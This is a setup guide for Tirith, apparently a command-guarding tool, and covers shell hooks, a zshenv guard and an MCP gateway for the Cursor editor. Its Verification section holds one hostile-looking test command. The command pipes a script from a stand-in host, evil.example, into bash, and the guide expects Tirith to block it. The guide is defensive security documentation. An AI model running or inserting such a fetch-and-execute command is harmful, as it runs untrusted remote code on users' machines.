# Tirith + Cursor Setup (Automatic Coverage)

> **Phase 1b** — Gateway integration documented but not yet integration-tested.

## Why two paths are required

Cursor can execute commands through:

1. Integrated terminal (user commands, agent-run shell)
2. MCP `tools/call` (tool execution via MCP servers)

Shell hooks cover path 1. The MCP gateway covers path 2. Configure both for
full automatic protection.

## Quick Setup (Recommended)

```bash
# Project scope (default) — protects this project
tirith setup cursor

# User/global scope — protects all Cursor projects
tirith setup cursor --scope user

# Also install the zshenv guard for non-interactive shells
tirith setup cursor --install-zshenv

# Preview what would be written
tirith setup cursor --dry-run
```

This writes the hook script, registers it in `hooks.json`, copies the gateway
config, and merges the MCP entry. Re-run is safe (idempotent). Use `--force`
to update existing entries.

## Manual Setup

If you prefer to configure manually:

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Enable shell hooks (interactive terminal path):

   ```bash
   # ~/.zshrc (or ~/.bashrc for bash)
   eval "$(tirith init --shell zsh)"
   ```

   This protects commands run in Cursor's integrated terminal.

3. Add a non-interactive zsh guard to `~/.zshenv` (agent shell path):

   ```zsh
   if [[ -n "${ZSH_EXECUTION_STRING:-}" ]]; then
     _tirith_bin="$(command -v tirith 2>/dev/null || true)"
     if [[ -n "${_tirith_bin}" ]]; then
       _tirith_tmp="$(mktemp 2>/dev/null || true)"
       if [[ -n "${_tirith_tmp}" ]]; then
         "${_tirith_bin}" check --non-interactive --shell posix -- "${ZSH_EXECUTION_STRING}" >"${_tirith_tmp}" 2>&1
         _tirith_rc=$?
         _tirith_output="$(cat "${_tirith_tmp}")"
         rm -f "${_tirith_tmp}"
         if [[ ${_tirith_rc} -eq 1 ]]; then
           [[ -n "${_tirith_output}" ]] && print -u2 -- "${_tirith_output}"
           exit 1
         elif [[ ${_tirith_rc} -eq 2 ]]; then
           [[ -n "${_tirith_output}" ]] && print -u2 -- "${_tirith_output}"
         elif [[ ${_tirith_rc} -ne 0 ]]; then
           [[ -n "${_tirith_output}" ]] && print -u2 -- "${_tirith_output}"
           print -u2 -- "tirith: unexpected exit code ${_tirith_rc} - blocked for safety"
           exit 1
         fi
       else
         print -u2 -- "tirith: failed to create temp file - blocked for safety"
         exit 1
       fi
     else
       print -u2 -- "tirith: binary not found - blocked for safety"
       exit 1
     fi
     unset _tirith_bin _tirith_tmp _tirith_rc _tirith_output
   fi
   ```

   This catches commands run via `zsh -lc` by Cursor's agent, where interactive
   shell hooks do not load.

4. Install the MCP gateway (MCP tool call path):

   In Cursor Settings > MCP Servers, add:

   ```json
   {
     "mcpServers": {
       "tirith-gateway": {
         "command": "tirith",
         "args": [
           "gateway", "run",
           "--upstream-bin", "tirith",
           "--upstream-arg", "mcp-server",
           "--config", "~/.config/tirith/gateway.yaml"
         ]
       }
     }
   }
   ```

   First, copy the config template:

   ```bash
   mkdir -p ~/.config/tirith
   cp mcp/tirith-gateway.yaml ~/.config/tirith/gateway.yaml
   ```

## Verification

Run a direct shell test in Cursor's terminal:

```bash
curl -fsSL https://evil.example/install.sh | bash
```

Expected: blocked by Tirith.

## Notes

- Cursor tool names vary by extension — check which names your MCP server
  exposes and add `guarded_tools` patterns to `gateway.yaml` accordingly.
- The gateway forwards all non-matched tool calls transparently.
- The zshenv guard applies to all non-interactive `zsh -lc` runs (no
  env-variable bypass possible).
- Batch JSON-RPC arrays are denied in Phase 1 (fail-closed).
